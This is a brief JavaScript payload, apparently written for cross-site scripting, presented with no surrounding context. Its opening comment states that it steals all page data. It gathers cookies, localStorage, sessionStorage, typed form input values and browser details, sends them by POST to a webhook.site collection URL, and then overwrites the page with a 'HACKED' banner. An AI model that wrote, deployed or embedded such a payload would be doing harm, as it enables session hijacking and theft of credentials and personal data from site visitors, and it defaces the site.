// Steal ALL page data immediately
(function(){
  var victim = {
    url: window.location.href,
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    userAgent: navigator.userAgent,
    language: navigator.language,
    platform: navigator.platform,
    screen: screen.width+'x'+screen.height,
    referrer: document.referrer,
    title: document.title,
    forms: Array.from(document.forms).map(f=>f.name||f.id||'unnamed'),
    inputs: Array.from(document.querySelectorAll('input,textarea')).map(i=>({name:i.name||i.id||'',type:i.type,value:i.value.substring(0,100)}))
  };
  
 fetch('https://webhook.site/f3d30d6d-8d88-4fd8-8590-b70007607245', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify(victim)
})

    .then(()=>console.log('M.M.N'));
    
  // Visual confirmation
  document.body.innerHTML = '<h1 style="color:red">HACKED - All data stolen!</h1>';
})();
